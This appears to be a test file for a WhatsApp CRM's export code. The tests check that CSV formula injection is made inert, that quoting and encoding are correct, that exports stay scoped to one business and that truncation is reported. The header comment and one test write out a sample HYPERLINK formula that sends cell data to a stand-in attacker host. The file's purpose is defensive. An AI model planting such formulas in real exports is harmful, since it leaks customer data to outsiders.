/**
 * Getting the data out, and the attack that comes back in with it.
 *
 * ============================================================
 * WHY A CSV EXPORT IS A SECURITY SURFACE HERE
 * ============================================================
 *
 * Excel, LibreOffice and Google Sheets all EVALUATE a cell whose text begins
 * with `=`, `+`, `-`, `@`, a tab or a carriage return. Every cell in these
 * exports carries text a customer typed — their WhatsApp display name, their
 * messages — so anybody who can message this platform can put a formula into a
 * file the business will later open on its own machine.
 *
 *   =HYPERLINK("https://evil.example/?d="&A1&A2, "Click for invoice")
 *
 * That is not a theoretical grade of bug for a WhatsApp CRM: the input is
 * unauthenticated strangers, and the export is the door. It is the reason this
 * file exists and the reason the CSV builder is a module rather than a join.
 *
 * ============================================================
 * AND THE ONE THAT IS QUIETER
 * ============================================================
 *
 * An export that silently truncates. A business reconciling against a file
 * missing its last thousand messages finds a gap it cannot explain and does not
 * know to distrust the file. Truncation is reported, never swallowed.
 */
import { test } from "node:test";
import assert from "node:assert/strict";
import { readFileSync } from "node:fs";
import { fileURLToPath } from "node:url";
import { dirname, join } from "node:path";

import { csvCell, toCsv, csvFilename } from "@nexus/shared";
import { withoutComments } from "../../../scripts/recurrence/source.mjs";

const here = dirname(fileURLToPath(import.meta.url));
const root = join(here, "..", "..", "..");
const read = (...p) => readFileSync(join(root, ...p), "utf8");

const ROUTE = withoutComments(read("apps", "api", "src", "routes", "contacts.ts"));
const DB = read("packages", "db", "src", "contacts.ts");

// ============================================================
// Formula injection
// ============================================================

test("a cell that would execute is made inert", () => {
  // Every one of these is a real leading character a spreadsheet acts on, and a
  // customer can put any of them in their WhatsApp display name.
  for (const dangerous of ["=1+1", "+1", "-1", "@SUM(A1)", "\tx", "\rx"]) {
    const cell = csvCell(dangerous);
    assert.ok(
      cell.startsWith("'") || cell.startsWith(`"'`),
      `"${JSON.stringify(dangerous)}" would be evaluated by a spreadsheet`
    );
  }
});

test("the real attack, end to end", () => {
  const attack = '=HYPERLINK("https://evil.example/?d="&A1,"Invoice")';
  const csv = toCsv(["name", "phone"], [[attack, "971500000000"]]);
  // The formula must not survive as one: a cell beginning with = is executed
  // the moment the file is opened, with no warning in most configurations.
  assert.ok(!csv.includes("\n=HYPERLINK"), "the formula reached the file intact");
  assert.ok(csv.includes("'=HYPERLINK") || csv.includes(`"'=HYPERLINK`));
});

test("the customer's own words are preserved, not edited", () => {
  // Prefixed rather than stripped. A message that genuinely began with a minus
  // sign should still read that way to a person -- silently rewriting what a
  // customer said to make a file safe is the worse trade.
  const cell = csvCell("-40% off everything");
  assert.ok(cell.includes("-40% off everything"), "the text was altered rather than escaped");
});

test("ordinary text is left alone", () => {
  // A guard that quoted everything would be safe and unreadable.
  assert.equal(csvCell("Ahmed"), "Ahmed");
  assert.equal(csvCell(42), "42");
  assert.equal(csvCell(true), "true");
});

// ============================================================
// Quoting, which is where a CSV goes wrong quietly
// ============================================================

test("commas, quotes and newlines cannot shift the columns", () => {
  // The damage here is silent: the file opens, the columns shift, and every row
  // after it is wrong in a way that looks like data rather than corruption.
  assert.equal(csvCell("Ahmed, Sons & Co"), '"Ahmed, Sons & Co"');
  assert.equal(csvCell('He said "hello"'), '"He said ""hello"""');
  assert.equal(csvCell("line one\nline two"), '"line one\nline two"');
});

test("nothing becomes the word null", () => {
  // String(null) is "null", which somebody then has to explain to whoever
  // opened the file.
  assert.equal(csvCell(null), "");
  assert.equal(csvCell(undefined), "");
});

test("a date is written in a form that sorts", () => {
  assert.equal(csvCell(new Date("2026-08-25T09:00:00Z")), "2026-08-25T09:00:00.000Z");
});

test("the file is readable by the spreadsheet these businesses actually use", () => {
  const csv = toCsv(["a"], [["أحمد"]]);
  // Without a BOM, Excel reads UTF-8 as the system codepage and every Arabic
  // name in the file arrives as mojibake. This platform answers in Arabic.
  assert.ok(csv.startsWith("﻿"), "no BOM — Arabic names will be mangled in Excel");
  // CRLF, per RFC 4180 and per the least forgiving reader of the two.
  assert.ok(csv.includes("\r\n"), "rows are not CRLF-separated");
});

test("the filename says which business and which day", () => {
  // An export is a snapshot; a folder of `customers.csv` tells nobody which is
  // which.
  const name = csvFilename("juris-prime-legal", "customers", new Date("2026-08-25T00:00:00Z"));
  assert.equal(name, "juris-prime-legal-customers-2026-08-25.csv");
  // And a business name with a slash in it must not become a path.
  assert.ok(!csvFilename("a/b", "x", new Date("2026-08-25T00:00:00Z")).includes("/"));
});

// ============================================================
// What an export may contain
// ============================================================

test("an export is scoped to one business, through the shared predicate", () => {
  // Two competing law firms answer on this number. An export carrying the other
  // one's customers is the egress this platform's whole boundary exists to
  // stop, and it would leave the building as a file.
  assert.ok(DB.includes("export async function exportContacts"));
  const at = DB.indexOf("export async function exportContacts");
  const fn = DB.slice(at, DB.indexOf("export async function exportMessages"));
  assert.ok(fn.includes("contactServedBy("), "the customer export is not scoped by served business");

  const messagesAt = DB.indexOf("export async function exportMessages");
  const messages = DB.slice(messagesAt, DB.indexOf("export async function exportContactRecord"));
  assert.ok(
    messages.includes("coalesce(c.routed_organization_id, c.organization_id) = $1"),
    "the message export is keyed on the number's owner, so it carries other firms' conversations"
  );
});

test("the bulk export says whether a summary is held, never what it says", () => {
  // A bulk export of what this platform INFERRED about people is a different
  // and much larger disclosure than a list of who they are. The per-customer
  // export carries it, where one person is asking about themselves.
  const at = DB.indexOf("export async function exportContacts");
  const fn = DB.slice(at, DB.indexOf("export async function exportMessages"));
  assert.ok(fn.includes("summary_held"), "the export does not say whether anything is held");
  assert.ok(!fn.includes("cm.summary"), "the bulk export carries every remembered summary");
});

test("truncation is reported rather than swallowed", () => {
  // A file missing its last thousand messages that looks complete is worse than
  // no file: somebody reconciles against it and finds a gap they cannot explain.
  assert.ok(DB.includes("truncated: rows.length > limit"), "the export cannot tell it was cut");
  assert.ok(
    ROUTE.includes('response.headers.set("x-export-truncated", "true")'),
    "the caller is never told the file is partial"
  );
});

test("the export is not cached", () => {
  // A snapshot of a moving record, served from a cache, is a snapshot of an
  // older one wearing today's filename.
  assert.ok(ROUTE.includes('"cache-control": "no-store"'));
});

test("a browser saves it rather than rendering it", () => {
  assert.ok(ROUTE.includes('"content-type": "text/csv; charset=utf-8"'));
  assert.ok(ROUTE.includes("attachment; filename="));
});

// ============================================================
// The subject access request
// ============================================================

test("one person's whole record can be produced", () => {
  // The other half of the erase button: "delete what you hold about me" and
  // "give me what you hold about me" are one request asked two ways, and this
  // platform could answer the first from a screen and the second not at all.
  assert.ok(ROUTE.includes('contactsRoute.get("/:slug/contacts/:contactId/export.json"'));
  assert.ok(DB.includes("export async function exportContactRecord"));
});

test("that record includes what was remembered about them", () => {
  // Unlike the bulk export. The subject of a summary is the one person entitled
  // to read it.
  assert.ok(ROUTE.includes("getContactMemory(organization.id, contactId)"));
  assert.ok(ROUTE.includes("remembered: memory"));
});

test("another firm's customer cannot be exported", () => {
  const at = ROUTE.indexOf('contactsRoute.get("/:slug/contacts/:contactId/export.json"');
  const body = ROUTE.slice(at);
  assert.ok(
    body.includes('return c.json({ error: "Customer not found" }, 404)'),
    "the per-customer export does not refuse a contact of another business"
  );
});
